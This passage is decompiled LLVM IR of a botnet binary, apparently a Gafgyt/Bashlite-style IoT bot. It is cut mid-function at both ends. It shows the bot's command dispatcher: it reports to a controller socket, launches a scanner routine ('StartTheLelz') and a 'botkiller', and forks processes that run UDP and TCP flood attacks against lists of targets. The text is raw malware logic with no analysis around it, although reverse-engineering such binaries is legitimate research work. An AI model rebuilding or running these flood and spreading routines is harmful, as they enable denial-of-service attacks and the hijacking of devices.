  %v3_1000a458 = icmp eq i32 %v0_1000a438, 0
  br i1 %v3_1000a458, label %dec_label_pc_1000a470, label %dec_label_pc_1000a460

dec_label_pc_1000a460:                            ; preds = %dec_label_pc_1000a438
  store i32 %v0_1000a438, i32* @global_var_10028800.512, align 4
  br label %dec_label_pc_1000b41c

dec_label_pc_1000a470:                            ; preds = %dec_label_pc_1000a438
  %v3_1000a48c = load i32, i32* @global_var_100287f8.254, align 4
  store i32 %v3_1000a48c, i32* %stack_var_-80, align 4
  store i32 268477600, i32* @lr, align 4
  %v3_1000a49c = call i32 @__GI_inet_ntoa(i32* nonnull %stack_var_-80, i32 268632064)
  %v0_1000a4a4 = load i32, i32* @r29, align 4
  store i32 268477628, i32* @lr, align 4
  %v5_1000a4b8 = call i32 @sockprintf(i32 %v0_1000a4a4, i32 ptrtoint ([26 x i8]* @global_var_100168ac.515 to i32), i32 %v3_1000a49c)
  %v2_1000a4c4 = call i32 @StartTheLelz(i32 10, i32 1000)
  %v1_1000a4cc = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000a4d0

dec_label_pc_1000a4d0:                            ; preds = %dec_label_pc_1000a400, %dec_label_pc_1000a368, %dec_label_pc_1000a470
  %v2_1000a4d4 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_100168c8.517 to i32), i32* @r4, align 4
  %v3_1000a4e4 = inttoptr i32 %v2_1000a4d4 to i8*
  %v4_1000a4e4 = call i32 @__GI_strcoll(i8* %v3_1000a4e4, i32 ptrtoint ([8 x i8]* @global_var_100168c8.517 to i32))
  %v3_1000a4ec = icmp eq i32 %v4_1000a4e4, 0
  br i1 %v3_1000a4ec, label %dec_label_pc_1000a4f4, label %dec_label_pc_1000a54c

dec_label_pc_1000a4f4:                            ; preds = %dec_label_pc_1000a4d0
  store i32 268477688, i32* @lr, align 4
  %v0_1000a4f4 = call i32 @listFork()
  %v3_1000a4fc = icmp eq i32 %v0_1000a4f4, 0
  br i1 %v3_1000a4fc, label %dec_label_pc_1000a504, label %dec_label_pc_1000a54c

dec_label_pc_1000a504:                            ; preds = %dec_label_pc_1000a4f4
  %v3_1000a510 = load i32, i32* @global_var_100287f8.254, align 4
  store i32 %v3_1000a510, i32* %stack_var_-80, align 4
  store i32 268477732, i32* @lr, align 4
  %v3_1000a520 = call i32 @__GI_inet_ntoa(i32* nonnull %stack_var_-80, i32 268632064)
  %v0_1000a528 = load i32, i32* @r29, align 4
  store i32 268477760, i32* @lr, align 4
  %v5_1000a53c = call i32 @sockprintf(i32 %v0_1000a528, i32 ptrtoint ([29 x i8]* @global_var_100168d0.518 to i32), i32 %v3_1000a520)
  %v1_1000a540 = call i32 @botkiller(i32 %v5_1000a53c)
  %v1_1000a548 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000a54c

dec_label_pc_1000a54c:                            ; preds = %dec_label_pc_1000a4f4, %dec_label_pc_1000a4d0, %dec_label_pc_1000a504
  %v2_1000a550 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([12 x i8]* @global_var_100168f0.520 to i32), i32* @r4, align 4
  %v3_1000a560 = inttoptr i32 %v2_1000a550 to i8*
  %v4_1000a560 = call i32 @__GI_strcoll(i8* %v3_1000a560, i32 ptrtoint ([12 x i8]* @global_var_100168f0.520 to i32))
  %v3_1000a568 = icmp eq i32 %v4_1000a560, 0
  br i1 %v3_1000a568, label %dec_label_pc_1000a570, label %dec_label_pc_1000a5b0

dec_label_pc_1000a570:                            ; preds = %dec_label_pc_1000a54c
  %v3_1000a57c = load i32, i32* @global_var_100287f8.254, align 4
  store i32 %v3_1000a57c, i32* %stack_var_-80, align 4
  store i32 268477840, i32* @lr, align 4
  %v3_1000a58c = call i32 @__GI_inet_ntoa(i32* nonnull %stack_var_-80, i32 268632064)
  %v0_1000a594 = load i32, i32* @r29, align 4
  store i32 ptrtoint (i32* @global_var_1000a5ac.522 to i32), i32* @lr, align 4
  %v5_1000a5a8 = call i32 @sockprintf(i32 %v0_1000a594, i32 ptrtoint ([17 x i8]* @global_var_100168fc.521 to i32), i32 %v3_1000a58c)
  br label %dec_label_pc_1000b41c

dec_label_pc_1000a5b0:                            ; preds = %dec_label_pc_1000a54c
  %v2_1000a5b4 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_10016910.523 to i32), i32* @r4, align 4
  %v3_1000a5c4 = inttoptr i32 %v2_1000a5b4 to i8*
  %v4_1000a5c4 = call i32 @__GI_strcoll(i8* %v3_1000a5c4, i32 ptrtoint ([4 x i8]* @global_var_10016910.523 to i32))
  %v3_1000a5cc = icmp eq i32 %v4_1000a5c4, 0
  br i1 %v3_1000a5cc, label %dec_label_pc_1000a5d4, label %dec_label_pc_1000a938

dec_label_pc_1000a5d4:                            ; preds = %dec_label_pc_1000a5b0
  %tmp97 = icmp slt i32 %arg1, 6
  br i1 %tmp97, label %dec_label_pc_1000a708, label %dec_label_pc_1000a5e0

dec_label_pc_1000a5e0:                            ; preds = %dec_label_pc_1000a5d4
  %v1_1000a5e4 = add i32 %tmp, 12
  %v1_1000a5e8 = inttoptr i32 %v1_1000a5e4 to i32*
  %v2_1000a5e8 = load i32, i32* %v1_1000a5e8, align 4
  store i32 268477940, i32* @lr, align 4
  %v2_1000a5f0 = call i32 @atol(i32 %v2_1000a5e8, i32 %v1_1000a5e4)
  %v4_1000a5fc = icmp eq i32 %v2_1000a5f0, -1
  br i1 %v4_1000a5fc, label %dec_label_pc_1000a708, label %dec_label_pc_1000a604

dec_label_pc_1000a604:                            ; preds = %dec_label_pc_1000a5e0
  %v1_1000a608 = add i32 %tmp, 8
  %v1_1000a60c = inttoptr i32 %v1_1000a608 to i32*
  %v2_1000a60c = load i32, i32* %v1_1000a60c, align 4
  store i32 268477976, i32* @lr, align 4
  %v2_1000a614 = call i32 @atol(i32 %v2_1000a60c, i32 %v1_1000a608)
  %v4_1000a620 = icmp eq i32 %v2_1000a614, -1
  br i1 %v4_1000a620, label %dec_label_pc_1000a708, label %dec_label_pc_1000a628

dec_label_pc_1000a628:                            ; preds = %dec_label_pc_1000a604
  %v1_1000a62c = add i32 %tmp, 16
  %v1_1000a630 = inttoptr i32 %v1_1000a62c to i32*
  %v2_1000a630 = load i32, i32* %v1_1000a630, align 4
  store i32 268478012, i32* @lr, align 4
  %v2_1000a638 = call i32 @atol(i32 %v2_1000a630, i32 %v1_1000a62c)
  %v4_1000a644 = icmp eq i32 %v2_1000a638, -1
  br i1 %v4_1000a644, label %dec_label_pc_1000a708, label %dec_label_pc_1000a64c

dec_label_pc_1000a64c:                            ; preds = %dec_label_pc_1000a628
  %v1_1000a650 = add i32 %tmp, 20
  %v1_1000a654 = inttoptr i32 %v1_1000a650 to i32*
  %v2_1000a654 = load i32, i32* %v1_1000a654, align 4
  store i32 268478048, i32* @lr, align 4
  %v2_1000a65c = call i32 @atol(i32 %v2_1000a654, i32 %v1_1000a650)
  %v4_1000a668 = icmp eq i32 %v2_1000a65c, -1
  br i1 %v4_1000a668, label %dec_label_pc_1000a708, label %dec_label_pc_1000a670

dec_label_pc_1000a670:                            ; preds = %dec_label_pc_1000a64c
  %v2_1000a678 = load i32, i32* %v1_1000a654, align 4
  store i32 268478084, i32* @lr, align 4
  %v2_1000a680 = call i32 @atol(i32 %v2_1000a678, i32 %v1_1000a650)
  %v3_1000a68c = icmp sgt i32 %v2_1000a680, 65536
  br i1 %v3_1000a68c, label %dec_label_pc_1000a708, label %dec_label_pc_1000a694

dec_label_pc_1000a694:                            ; preds = %dec_label_pc_1000a670
  %v2_1000a69c = load i32, i32* %v1_1000a654, align 4
  store i32 268478120, i32* @lr, align 4
  %v2_1000a6a4 = call i32 @atol(i32 %v2_1000a69c, i32 %v1_1000a650)
  %v3_1000a6b4 = icmp sgt i32 %v2_1000a6a4, 65500
  br i1 %v3_1000a6b4, label %dec_label_pc_1000a708, label %dec_label_pc_1000a6bc

dec_label_pc_1000a6bc:                            ; preds = %dec_label_pc_1000a694
  %v2_1000a6c4 = load i32, i32* %v1_1000a630, align 4
  store i32 268478160, i32* @lr, align 4
  %v2_1000a6cc = call i32 @atol(i32 %v2_1000a6c4, i32 %v1_1000a62c)
  %v2_1000a6d4 = icmp sgt i32 %v2_1000a6cc, 32
  br i1 %v2_1000a6d4, label %dec_label_pc_1000a708, label %dec_label_pc_1000a6dc

dec_label_pc_1000a6dc:                            ; preds = %dec_label_pc_1000a6bc
  %v1_1000a6e0 = icmp slt i32 %arg1, 7
  %v3_1000a6e0 = icmp eq i32 %arg1, 7
  br i1 %v3_1000a6e0, label %dec_label_pc_1000a6e8, label %dec_label_pc_1000a728

dec_label_pc_1000a6e8:                            ; preds = %dec_label_pc_1000a6dc
  %v1_1000a6ec = add i32 %tmp, 24
  %v1_1000a6f0 = inttoptr i32 %v1_1000a6ec to i32*
  %v2_1000a6f0 = load i32, i32* %v1_1000a6f0, align 4
  store i32 268478204, i32* @lr, align 4
  %v2_1000a6f8 = call i32 @atol(i32 %v2_1000a6f0, i32 %v1_1000a6ec)
  %v2_1000a700 = icmp sgt i32 %v2_1000a6f8, 0
  br i1 %v2_1000a700, label %dec_label_pc_1000a728, label %dec_label_pc_1000a708

dec_label_pc_1000a708:                            ; preds = %dec_label_pc_1000a6e8, %dec_label_pc_1000a6bc, %dec_label_pc_1000a694, %dec_label_pc_1000a670, %dec_label_pc_1000a64c, %dec_label_pc_1000a628, %dec_label_pc_1000a604, %dec_label_pc_1000a5e0, %dec_label_pc_1000a5d4
  %v3_1000a70c = load i32, i32* @global_var_100287d0.29, align 4
  store i32 ptrtoint (i32* @global_var_1000a724.525 to i32), i32* @lr, align 4
  %v4_1000a720 = call i32 @sockprintf(i32 %v3_1000a70c, i32 ptrtoint ([113 x i8]* @global_var_10016914.524 to i32), i32 268500992)
  br label %dec_label_pc_1000b41c

dec_label_pc_1000a728:                            ; preds = %dec_label_pc_1000a6dc, %dec_label_pc_1000a6e8
  %v1_1000a72c = add i32 %tmp, 4
  %v1_1000a730 = inttoptr i32 %v1_1000a72c to i32*
  %v2_1000a730 = load i32, i32* %v1_1000a730, align 4
  %v2_1000a740 = load i32, i32* %v1_1000a60c, align 4
  store i32 268478284, i32* @lr, align 4
  %v2_1000a748 = call i32 @atol(i32 %v2_1000a740, i32 %v1_1000a608)
  %v2_1000a75c = load i32, i32* %v1_1000a5e8, align 4
  store i32 268478312, i32* @lr, align 4
  %v2_1000a764 = call i32 @atol(i32 %v2_1000a75c, i32 %v1_1000a5e4)
  %v2_1000a778 = load i32, i32* %v1_1000a630, align 4
  store i32 268478340, i32* @lr, align 4
  %v2_1000a780 = call i32 @atol(i32 %v2_1000a778, i32 %v1_1000a62c)
  %v2_1000a794 = load i32, i32* %v1_1000a654, align 4
  store i32 268478368, i32* @lr, align 4
  %v2_1000a79c = call i32 @atol(i32 %v2_1000a794, i32 %v1_1000a650)
  br i1 %v1_1000a6e0, label %dec_label_pc_1000a7d8.thread, label %dec_label_pc_1000a7d8

dec_label_pc_1000a7d8.thread:                     ; preds = %dec_label_pc_1000a728
  br label %dec_label_pc_1000a808

dec_label_pc_1000a7d8:                            ; preds = %dec_label_pc_1000a728
  %v1_1000a7b8 = add i32 %tmp, 24
  %v1_1000a7bc = inttoptr i32 %v1_1000a7b8 to i32*
  %v2_1000a7bc = load i32, i32* %v1_1000a7bc, align 4
  store i32 268478408, i32* @lr, align 4
  %v2_1000a7c4 = call i32 @atol(i32 %v2_1000a7bc, i32 %v1_1000a7b8)
  br i1 %v3_1000a6e0, label %dec_label_pc_1000a808, label %dec_label_pc_1000a7ec

dec_label_pc_1000a7ec:                            ; preds = %dec_label_pc_1000a7d8
  %v1_1000a7f0 = add i32 %tmp, 28
  %v1_1000a7f4 = inttoptr i32 %v1_1000a7f0 to i32*
  %v2_1000a7f4 = load i32, i32* %v1_1000a7f4, align 4
  store i32 268478464, i32* @lr, align 4
  %v2_1000a7fc = call i32 @atol(i32 %v2_1000a7f4, i32 %v1_1000a7f0)
  br label %dec_label_pc_1000a81c

dec_label_pc_1000a808:                            ; preds = %dec_label_pc_1000a7d8.thread, %dec_label_pc_1000a7d8
  %storemerge1023 = phi i32 [ 1000, %dec_label_pc_1000a7d8.thread ], [ %v2_1000a7c4, %dec_label_pc_1000a7d8 ]
  br label %dec_label_pc_1000a81c

dec_label_pc_1000a81c:                            ; preds = %dec_label_pc_1000a7ec, %dec_label_pc_1000a808
  %storemerge1022 = phi i32 [ %storemerge1023, %dec_label_pc_1000a808 ], [ %v2_1000a7c4, %dec_label_pc_1000a7ec ]
  %storemerge9 = phi i32 [ 1000000, %dec_label_pc_1000a808 ], [ %v2_1000a7fc, %dec_label_pc_1000a7ec ]
  %tmp99 = icmp slt i32 %arg1, 9
  br i1 %tmp99, label %dec_label_pc_1000a84c, label %dec_label_pc_1000a830

dec_label_pc_1000a830:                            ; preds = %dec_label_pc_1000a81c
  %v1_1000a834 = add i32 %tmp, 32
  %v1_1000a838 = inttoptr i32 %v1_1000a834 to i32*
  %v2_1000a838 = load i32, i32* %v1_1000a838, align 4
  store i32 268478532, i32* @lr, align 4
  %v2_1000a840 = call i32 @atol(i32 %v2_1000a838, i32 %v1_1000a834)
  br label %dec_label_pc_1000a854

dec_label_pc_1000a84c:                            ; preds = %dec_label_pc_1000a81c
  br label %dec_label_pc_1000a854

dec_label_pc_1000a854:                            ; preds = %dec_label_pc_1000a830, %dec_label_pc_1000a84c
  %storemerge8 = phi i32 [ 0, %dec_label_pc_1000a84c ], [ %v2_1000a840, %dec_label_pc_1000a830 ]
  store i32 %v2_1000a730, i32* @r3, align 4
  store i32 268478572, i32* @lr, align 4
  %v2_1000a868 = call i32 @__GI_strchr(i32 %v2_1000a730, i32 44)
  %v3_1000a870 = icmp eq i32 %v2_1000a868, 0
  br i1 %v3_1000a870, label %dec_label_pc_1000a8fc, label %dec_label_pc_1000a878

dec_label_pc_1000a878:                            ; preds = %dec_label_pc_1000a854
  store i32 ptrtoint (i32* @global_var_10016524.368 to i32), i32* @r4, align 4
  store i32 268478604, i32* @lr, align 4
  %v3_1000a888 = call i32 @__GI_strtok(i32 %v2_1000a730, i32 ptrtoint (i32* @global_var_10016524.368 to i32), i32 268500992)
  %v3_1000a8f041 = icmp eq i32 %v3_1000a888, 0
  br i1 %v3_1000a8f041, label %dec_label_pc_1000b41c, label %dec_label_pc_1000a898

dec_label_pc_1000a898:                            ; preds = %dec_label_pc_1000a878, %dec_label_pc_1000a8d4
  %storemerge2142 = phi i32 [ %v3_1000a8e0, %dec_label_pc_1000a8d4 ], [ %v3_1000a888, %dec_label_pc_1000a878 ]
  store i32 268478620, i32* @lr, align 4
  %v0_1000a898 = call i32 @listFork()
  %v3_1000a8a0 = icmp eq i32 %v0_1000a898, 0
  br i1 %v3_1000a8a0, label %dec_label_pc_1000a8a8, label %dec_label_pc_1000a8d4

dec_label_pc_1000a8a8:                            ; preds = %dec_label_pc_1000a898
  store i32 %storemerge8, i32* @r10, align 4
  %v7_1000a8c8 = call i32 @sendUDP(i32 %storemerge2142, i32 %v2_1000a748, i32 %v2_1000a764, i32 %v2_1000a780, i32 %v2_1000a79c, i32 %storemerge1022, i32 %storemerge9)
  %v1_1000a8d0 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000a8d4

dec_label_pc_1000a8d4:                            ; preds = %dec_label_pc_1000a898, %dec_label_pc_1000a8a8
  store i32 ptrtoint (i32* @global_var_10016524.368 to i32), i32* @r4, align 4
  store i32 268478692, i32* @lr, align 4
  %v3_1000a8e0 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_10016524.368 to i32), i32 268500992)
  %v3_1000a8f0 = icmp eq i32 %v3_1000a8e0, 0
  br i1 %v3_1000a8f0, label %dec_label_pc_1000b41c, label %dec_label_pc_1000a898

dec_label_pc_1000a8fc:                            ; preds = %dec_label_pc_1000a854
  store i32 268478720, i32* @lr, align 4
  %v0_1000a8fc = call i32 @listFork()
  %v3_1000a904 = icmp eq i32 %v0_1000a8fc, 0
  br i1 %v3_1000a904, label %dec_label_pc_1000a90c, label %dec_label_pc_1000b41c

dec_label_pc_1000a90c:                            ; preds = %dec_label_pc_1000a8fc
  store i32 %storemerge8, i32* @r10, align 4
  %v7_1000a92c = call i32 @sendUDP(i32 %v2_1000a730, i32 %v2_1000a748, i32 %v2_1000a764, i32 %v2_1000a780, i32 %v2_1000a79c, i32 %storemerge1022, i32 %storemerge9)
  %v1_1000a934 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000a938

dec_label_pc_1000a938:                            ; preds = %dec_label_pc_1000a5b0, %dec_label_pc_1000a90c
  %v2_1000a93c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_10016988.529 to i32), i32* @r4, align 4
  %v3_1000a94c = inttoptr i32 %v2_1000a93c to i8*
  %v4_1000a94c = call i32 @__GI_strcoll(i8* %v3_1000a94c, i32 ptrtoint ([4 x i8]* @global_var_10016988.529 to i32))
  %v3_1000a954 = icmp eq i32 %v4_1000a94c, 0
  br i1 %v3_1000a954, label %dec_label_pc_1000a95c, label %dec_label_pc_1000ac24

dec_label_pc_1000a95c:                            ; preds = %dec_label_pc_1000a938
  %tmp100 = icmp slt i32 %arg1, 6
  br i1 %tmp100, label %dec_label_pc_1000aa4c, label %dec_label_pc_1000a968

dec_label_pc_1000a968:                            ; preds = %dec_label_pc_1000a95c
  %v1_1000a96c = add i32 %tmp, 12
  %v1_1000a970 = inttoptr i32 %v1_1000a96c to i32*
  %v2_1000a970 = load i32, i32* %v1_1000a970, align 4
  store i32 268478844, i32* @lr, align 4
  %v2_1000a978 = call i32 @atol(i32 %v2_1000a970, i32 %v1_1000a96c)
  %v4_1000a984 = icmp eq i32 %v2_1000a978, -1
  br i1 %v4_1000a984, label %dec_label_pc_1000aa4c, label %dec_label_pc_1000a98c

dec_label_pc_1000a98c:                            ; preds = %dec_label_pc_1000a968
  %v1_1000a990 = add i32 %tmp, 8
  %v1_1000a994 = inttoptr i32 %v1_1000a990 to i32*
  %v2_1000a994 = load i32, i32* %v1_1000a994, align 4
  store i32 268478880, i32* @lr, align 4
  %v2_1000a99c = call i32 @atol(i32 %v2_1000a994, i32 %v1_1000a990)
  %v4_1000a9a8 = icmp eq i32 %v2_1000a99c, -1
  br i1 %v4_1000a9a8, label %dec_label_pc_1000aa4c, label %dec_label_pc_1000a9b0

dec_label_pc_1000a9b0:                            ; preds = %dec_label_pc_1000a98c
  %v1_1000a9b4 = add i32 %tmp, 16
  %v1_1000a9b8 = inttoptr i32 %v1_1000a9b4 to i32*
  %v2_1000a9b8 = load i32, i32* %v1_1000a9b8, align 4
  store i32 268478916, i32* @lr, align 4
  %v2_1000a9c0 = call i32 @atol(i32 %v2_1000a9b8, i32 %v1_1000a9b4)
  %v4_1000a9cc = icmp eq i32 %v2_1000a9c0, -1
  br i1 %v4_1000a9cc, label %dec_label_pc_1000aa4c, label %dec_label_pc_1000a9d4

dec_label_pc_1000a9d4:                            ; preds = %dec_label_pc_1000a9b0
  %v2_1000a9dc = load i32, i32* %v1_1000a9b8, align 4
  store i32 268478952, i32* @lr, align 4
  %v2_1000a9e4 = call i32 @atol(i32 %v2_1000a9dc, i32 %v1_1000a9b4)
  %v2_1000a9ec = icmp sgt i32 %v2_1000a9e4, 32
  br i1 %v2_1000a9ec, label %dec_label_pc_1000aa4c, label %dec_label_pc_1000a9f4

dec_label_pc_1000a9f4:                            ; preds = %dec_label_pc_1000a9d4
  %tmp101 = icmp slt i32 %arg1, 7
  br i1 %tmp101, label %dec_label_pc_1000aa20, label %dec_label_pc_1000aa00

dec_label_pc_1000aa00:                            ; preds = %dec_label_pc_1000a9f4
  %v1_1000aa04 = add i32 %tmp, 24
  %v1_1000aa08 = inttoptr i32 %v1_1000aa04 to i32*
  %v2_1000aa08 = load i32, i32* %v1_1000aa08, align 4
  store i32 268478996, i32* @lr, align 4
  %v2_1000aa10 = call i32 @atol(i32 %v2_1000aa08, i32 %v1_1000aa04)
  %v1_1000aa18 = icmp slt i32 %v2_1000aa10, 0
  br i1 %v1_1000aa18, label %dec_label_pc_1000aa4c, label %dec_label_pc_1000aa20

dec_label_pc_1000aa20:                            ; preds = %dec_label_pc_1000aa00, %dec_label_pc_1000a9f4
  %v3_1000aa24 = icmp eq i32 %arg1, 8
  br i1 %v3_1000aa24, label %dec_label_pc_1000aa2c, label %dec_label_pc_1000aa6c

dec_label_pc_1000aa2c:                            ; preds = %dec_label_pc_1000aa20
  %v1_1000aa30 = add i32 %tmp, 28
  %v1_1000aa34 = inttoptr i32 %v1_1000aa30 to i32*
  %v2_1000aa34 = load i32, i32* %v1_1000aa34, align 4
  store i32 268479040, i32* @lr, align 4
  %v2_1000aa3c = call i32 @atol(i32 %v2_1000aa34, i32 %v1_1000aa30)
  %v2_1000aa44 = icmp sgt i32 %v2_1000aa3c, 0
  br i1 %v2_1000aa44, label %dec_label_pc_1000aa6c, label %dec_label_pc_1000aa4c

dec_label_pc_1000aa4c:                            ; preds = %dec_label_pc_1000aa2c, %dec_label_pc_1000aa00, %dec_label_pc_1000a9d4, %dec_label_pc_1000a9b0, %dec_label_pc_1000a98c, %dec_label_pc_1000a968, %dec_label_pc_1000a95c
  %v3_1000aa50 = load i32, i32* @global_var_100287d0.29, align 4
  store i32 ptrtoint (i32* @global_var_1000aa68.531 to i32), i32* @lr, align 4
  %v4_1000aa64 = call i32 @sockprintf(i32 %v3_1000aa50, i32 ptrtoint ([186 x i8]* @global_var_1001698c.530 to i32), i32 268500992)
  br label %dec_label_pc_1000b41c

dec_label_pc_1000aa6c:                            ; preds = %dec_label_pc_1000aa20, %dec_label_pc_1000aa2c
  %v1_1000aa70 = add i32 %tmp, 4
  %v1_1000aa74 = inttoptr i32 %v1_1000aa70 to i32*
  %v2_1000aa74 = load i32, i32* %v1_1000aa74, align 4
  %v2_1000aa84 = load i32, i32* %v1_1000a994, align 4
  store i32 268479120, i32* @lr, align 4
  %v2_1000aa8c = call i32 @atol(i32 %v2_1000aa84, i32 %v1_1000a990)
  %v2_1000aaa0 = load i32, i32* %v1_1000a970, align 4
  store i32 268479148, i32* @lr, align 4
  %v2_1000aaa8 = call i32 @atol(i32 %v2_1000aaa0, i32 %v1_1000a96c)
  %v2_1000aabc = load i32, i32* %v1_1000a9b8, align 4
  store i32 268479176, i32* @lr, align 4
  %v2_1000aac4 = call i32 @atol(i32 %v2_1000aabc, i32 %v1_1000a9b4)
  %v1_1000aad4 = add i32 %tmp, 20
  %v1_1000aad8 = inttoptr i32 %v1_1000aad4 to i32*
  %v2_1000aad8 = load i32, i32* %v1_1000aad8, align 4
  br i1 %v3_1000aa24, label %dec_label_pc_1000aaec, label %dec_label_pc_1000ab08

dec_label_pc_1000aaec:                            ; preds = %dec_label_pc_1000aa6c
  %v1_1000aaf0 = add i32 %tmp, 28
  %v1_1000aaf4 = inttoptr i32 %v1_1000aaf0 to i32*
  %v2_1000aaf4 = load i32, i32* %v1_1000aaf4, align 4
  store i32 268479232, i32* @lr, align 4
  %v2_1000aafc = call i32 @atol(i32 %v2_1000aaf4, i32 %v1_1000aaf0)
  br label %dec_label_pc_1000ab10

dec_label_pc_1000ab08:                            ; preds = %dec_label_pc_1000aa6c
  br label %dec_label_pc_1000ab10

dec_label_pc_1000ab10:                            ; preds = %dec_label_pc_1000aaec, %dec_label_pc_1000ab08
  %storemerge7 = phi i32 [ 10, %dec_label_pc_1000ab08 ], [ %v2_1000aafc, %dec_label_pc_1000aaec ]
  br i1 %tmp101, label %dec_label_pc_1000ab40, label %dec_label_pc_1000ab24

dec_label_pc_1000ab24:                            ; preds = %dec_label_pc_1000ab10
  %v1_1000ab28 = add i32 %tmp, 24
  %v1_1000ab2c = inttoptr i32 %v1_1000ab28 to i32*
  %v2_1000ab2c = load i32, i32* %v1_1000ab2c, align 4
  store i32 268479288, i32* @lr, align 4
  %v2_1000ab34 = call i32 @atol(i32 %v2_1000ab2c, i32 %v1_1000ab28)
  br label %dec_label_pc_1000ab48

dec_label_pc_1000ab40:                            ; preds = %dec_label_pc_1000ab10
  br label %dec_label_pc_1000ab48

dec_label_pc_1000ab48:                            ; preds = %dec_label_pc_1000ab24, %dec_label_pc_1000ab40
  %storemerge6 = phi i32 [ 0, %dec_label_pc_1000ab40 ], [ %v2_1000ab34, %dec_label_pc_1000ab24 ]
  store i32 %v2_1000aa74, i32* @r3, align 4
  store i32 268479328, i32* @lr, align 4
  %v2_1000ab5c = call i32 @__GI_strchr(i32 %v2_1000aa74, i32 44)
  %v3_1000ab64 = icmp eq i32 %v2_1000ab5c, 0
  br i1 %v3_1000ab64, label %dec_label_pc_1000abec, label %dec_label_pc_1000ab6c

dec_label_pc_1000ab6c:                            ; preds = %dec_label_pc_1000ab48
  store i32 ptrtoint (i32* @global_var_10016524.368 to i32), i32* @r4, align 4
  store i32 268479360, i32* @lr, align 4
  %v3_1000ab7c = call i32 @__GI_strtok(i32 %v2_1000aa74, i32 ptrtoint (i32* @global_var_10016524.368 to i32), i32 268500992)
  %v3_1000abe037 = icmp eq i32 %v3_1000ab7c, 0
  br i1 %v3_1000abe037, label %dec_label_pc_1000ac24, label %dec_label_pc_1000ab8c

dec_label_pc_1000ab8c:                            ; preds = %dec_label_pc_1000ab6c, %dec_label_pc_1000abc4
  %storemerge1938 = phi i32 [ %v3_1000abd0, %dec_label_pc_1000abc4 ], [ %v3_1000ab7c, %dec_label_pc_1000ab6c ]
  store i32 268479376, i32* @lr, align 4
  %v0_1000ab8c = call i32 @listFork()
  %v3_1000ab94 = icmp eq i32 %v0_1000ab8c, 0
  br i1 %v3_1000ab94, label %dec_label_pc_1000ab9c, label %dec_label_pc_1000abc4

dec_label_pc_1000ab9c:                            ; preds = %dec_label_pc_1000ab8c
  %v7_1000abb8 = call i32 @sendTCP(i32 %storemerge1938, i32 %v2_1000aa8c, i32 %v2_1000aaa8, i32 %v2_1000aac4, i32 %v2_1000aad8, i32 %storemerge6, i32 %storemerge7)
  %v1_1000abc0 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000abc4

dec_label_pc_1000abc4:                            ; preds = %dec_label_pc_1000ab8c, %dec_label_pc_1000ab9c
  store i32 ptrtoint (i32* @global_var_10016524.368 to i32), i32* @r4, align 4
  store i32 268479444, i32* @lr, align 4
  %v3_1000abd0 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_10016524.368 to i32), i32 268500992)
  %v3_1000abe0 = icmp eq i32 %v3_1000abd0, 0
  br i1 %v3_1000abe0, label %dec_label_pc_1000ac24, label %dec_label_pc_1000ab8c

dec_label_pc_1000abec:                            ; preds = %dec_label_pc_1000ab48
  store i32 268479472, i32* @lr, align 4
  %v0_1000abec = call i32 @listFork()
  %v3_1000abf4 = icmp eq i32 %v0_1000abec, 0
  br i1 %v3_1000abf4, label %dec_label_pc_1000abfc, label %dec_label_pc_1000ac24

dec_label_pc_1000abfc:                            ; preds = %dec_label_pc_1000abec
  %v7_1000ac18 = call i32 @sendTCP(i32 %v2_1000aa74, i32 %v2_1000aa8c, i32 %v2_1000aaa8, i32 %v2_1000aac4, i32 %v2_1000aad8, i32 %storemerge6, i32 %storemerge7)
  %v1_1000ac20 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_1000ac24

dec_label_pc_1000ac24:                            ; preds = %dec_label_pc_1000abc4, %dec_label_pc_1000ab6c, %dec_label_pc_1000abec, %dec_label_pc_1000a938, %dec_label_pc_1000abfc
  %v2_1000ac28 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_10016a48.535 to i32), i32* @r4, align 4
  %v3_1000ac38 = inttoptr i32 %v2_1000ac28 to i8*
  %v4_1000ac38 = call i32 @__GI_strcoll(i8* %v3_1000ac38, i32 ptrtoint ([5 x i8]* @global_var_10016a48.535 to i32))
  %v3_1000ac40 = icmp eq i32 %v4_1000ac38, 0
  br i1 %v3_1000ac40, label %dec_label_pc_1000ac48, label %dec_label_pc_1000ae28

dec_label_pc_1000ac48:                            ; preds = %dec_label_pc_1000ac24
  %tmp102 = icmp slt i32 %arg1, 6
  br i1 %tmp102, label %dec_label_pc_1000b41c, label %dec_label_pc_1000ac54

dec_label_pc_1000ac54:                            ; preds = %dec_label_pc_1000ac48
  %v1_1000ac58 = add i32 %tmp, 4
  %v1_1000ac5c = inttoptr i32 %v1_1000ac58 to i32*
  %v2_1000ac5c = load i32, i32* %v1_1000ac5c, align 4
  store i32 %v2_1000ac5c, i32* @r3, align 4
  store i32 268479596, i32* @lr, align 4
  %v2_1000ac68 = call i32 @__GI_strchr(i32 %v2_1000ac5c, i32 44)
  %v3_1000ac70 = icmp eq i32 %v2_1000ac68, 0
  br i1 %v3_1000ac70, label %dec_label_pc_1000ad78, label %dec_label_pc_1000ac78

dec_label_pc_1000ac78:                            ; preds = %dec_label_pc_1000ac54
  %v2_1000ac80 = load i32, i32* %v1_1000ac5c, align 4
  store i32 ptrtoint (i32* @global_var_10016524.368 to i32), i32* @r4, align 4
  store i32 268479636, i32* @lr, align 4
  %v3_1000ac90 = call i32 @__GI_strtok(i32 %v2_1000ac80, i32 ptrtoint (i32* @global_var_10016524.368 to i32), i32 268500992)
  %v3_1000ad6c34 = icmp eq i32 %v3_1000ac90, 0
  br i1 %v3_1000ad6c34, label %dec_label_pc_1000ae28, label %dec_label_pc_1000aca0.lr.ph

dec_label_pc_1000aca0.lr.ph:                      ; preds = %dec_label_pc_1000ac78
  %v1_1000acd4 = add i32 %tmp, 12
  %v1_1000acd8 = inttoptr i32 %v1_1000acd4 to i32*
  %v1_1000ad00 = add i32 %tmp, 20
